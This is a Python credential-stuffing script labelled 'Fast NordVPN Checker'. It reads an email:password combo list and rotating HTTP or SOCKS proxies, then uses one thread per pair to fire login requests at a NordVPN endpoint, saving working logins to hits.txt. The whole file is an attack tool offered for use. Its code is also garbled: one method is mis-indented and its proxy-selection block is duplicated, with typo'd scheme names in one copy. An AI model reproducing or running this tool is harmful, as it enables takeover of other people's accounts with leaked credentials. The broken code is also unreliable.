import requests
import random
import os
from colorama import Fore, Style, init
import tkinter as tk
from tkinter import filedialog
import time
import threading
from sys import stdout

init(convert=True)

lock = threading.Lock()

def free_print(arg):
    lock.acquire()
    stdout.flush()
    print(arg)
    lock.release()

class NordVPN:
    def __init__(self):
        self.data = {
            'use_proxy': False,
            'proxy_type': None,
            'proxy_dir': None,
            'combo_dir': None,
            'checked': 0,
            'retries': 0,
            'cpm': 0,
        }

        self.custom = ''
        root = tk.Tk()
        root.withdraw()

    def __read(self, filename, method):
        output = []
        with open(filename, method, encoding='UTF-8') as file:
            lines = file.readlines()
            for l in lines:
                output.append(l.replace('\n', ''))
        return output

    def __make_copy(self):
        with open('data/temp_combo.txt', 'w', encoding='UTF-8') as file:
            accounts = self.__get_accounts()
            for x in accounts:
                file.write(x + '\n')

    def __get_accounts(self):
        account_list = self.__read(self.data['combo_dir'], 'r')
        return account_list

    def __get_proxy(self, proxy_type, direct):
        proxy_list = self.__read(self.data['proxy_dir'], 'r')
        proxies = {'http': '%s://%s' % (proxy_type, random.choice(proxy_list))}
        return proxies

    def custom_message(self, arg):
        self.custom = arg

    def cpm_counter(self):
        while True:
            previous = self.data['checked']
            time.sleep(4)
            after = self.data['checked']
            self.data['cpm'] = (after - previous) * 15

    def update_title(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            os.system('title Fast NordVPN Checker - Checked: %s ^| Retries: %s ^| CPM: %s ^| Time Elapsed: %s ^| Threads: %s' % (self.data['checked'], self.data['retries'], self.data['cpm'], elapsed, (threading.active_count() - 2)))
            time.sleep(0.4)

    def title(self):
        print(f'''{Fore.CYAN}

    \t\t\t\t      ▐ ▄       ▄▄▄  ·▄▄▄▄       ▌ ▐· ▄▄▄· ▐ ▄ 
    \t\t\t\t     •█▌▐█▪     ▀▄ █·██▪ ██     ▪█·█▌▐█ ▄█•█▌▐█
    \t\t\t\t     ▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌    ▐█▐█• ██▀·▐█▐▐▌
    \t\t\t\t     ██▐█▌▐█▌.▐▌▐█•█▌██. ██      ███ ▐█▪·•██▐█▌
    \t\t\t\t     ▀▀ █▪ ▀█▄▀▪.▀  ▀▀▀▀▀▀•    . ▀ .▀   ▀▀ █▪
    \t\t\t\t                                           
            {Style.RESET_ALL}''')

        def user_proxy(self):
        self.data['use_proxy'] = True

        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose proxy text file. ')

        proxy_dir = filedialog.askopenfilename()
        self.data['proxy_dir'] = proxy_dir

        try:
            proxy_type = int(input(f'[{Fore.CYAN}?{Style.RESET_ALL}] HTTPS[{Fore.CYAN}0{Style.RESET_ALL}]/SOCKS4[{Fore.CYAN}1{Style.RESET_ALL}]/SOCKS5[{Fore.CYAN}2{Style.RESET_ALL}] > '))

        except ValueError:
            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
            time.sleep(3)
            self.user_proxy()

        if proxy_type == 0:
            self.data['proxy_type'] = 'https'
        elif proxy_type == 1:
            self.data['proxy_type'] = 'ocks4'
        elif proxy_type == 2:
            self.data['proxy_type'] = 'ocks5'
        else:
            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
            time.sleep(3)
            self.user_proxy()

                if proxy_type == 0:
            self.data['proxy_type'] = 'https'
        elif proxy_type == 1:
            self.data['proxy_type'] = 'socks4'
        elif proxy_type == 2:
            self.data['proxy_type'] = 'socks5'
        else:
            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
            time.sleep(3)
            self.user_proxy()

    def combo(self):
        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose combo text file. ')

        combo_dir = filedialog.askopenfilename()
        self.data['combo_dir'] = combo_dir

    def start_checker(self):
        self.start = time.time()
        threading.Thread(target=self.update_title).start()
        threading.Thread(target=self.cpm_counter).start()

        self.__make_copy()

        with open('data/temp_combo.txt', 'r', encoding='UTF-8') as file:
            lines = file.readlines()
            for line in lines:
                email, password = line.replace('\n', '').split(':')
                threading.Thread(target=self.checker, args=(email, password)).start()

    def checker(self, email: str, password: str) -> None:
        try:
            proxies = self.__get_proxy(self.data['proxy_type'], 'direct')
            response = requests.get('https://nordvpn.com/wp-admin/admin-ajax.php?action=login', proxies=proxies, timeout=5, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }, data={
                'action': 'login',
                'username': email,
                'password': password
            })

            if 'uccess' in response.text:
                with open('hits.txt', 'a', encoding='UTF-8') as file:
                    file.write(f'{email}:{password}\n')
                free_print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Hit: {email}:{password}')
            else:
                free_print(f'[{Fore.RED}-{Style.RESET_ALL}] Bad: {email}:{password}')

            self.data['checked'] += 1

        except requests.exceptions.RequestException as e:
            self.data['retries'] += 1
            free_print(f'[{Fore.RED}!{Style.RESET_ALL}] ERROR: {e}')
            if self.data['use_proxy']:
                self.checker(email, password)
            else:
                self.checker(email, password)

    def run(self):
        self.title()
        self.custom_message('Fast NordVPN Checker')
        self.user_proxy()
        self.combo()
        self.start_checker()

if __name__ == '__main__':
    nord = NordVPN()
    nord.run()
